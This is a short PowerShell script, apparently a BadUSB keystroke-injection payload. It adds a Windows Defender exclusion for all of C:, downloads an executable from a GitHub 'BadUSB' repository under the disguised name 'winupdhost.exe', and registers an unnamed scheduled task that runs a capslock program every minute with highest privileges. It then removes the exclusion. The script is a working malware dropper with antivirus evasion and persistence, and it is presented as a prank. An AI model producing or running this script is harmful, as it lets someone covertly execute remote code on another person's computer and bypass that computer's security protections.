cd $env:Temp;
Add-MpPreference -ExclusionPath C:/;
iwr -Uri https://raw.githubusercontent.com/TobiS137/BadUSB/refs/heads/main/cAps-TroLl-v3/cAps-TroLl-v3.exe -O winupdhost.exe -UseBasicParsing;
Start-Sleep 1;
schtasks /create /tn "" /tr "C:\Users\Administrator\Documents\cAps-TroLl-v2\capslock.exe" /sc minute /mo 1 /rl highest /f /ru "$env:USERNAME";
Remove-MpPreference -ExclusionPath C:/;
exit
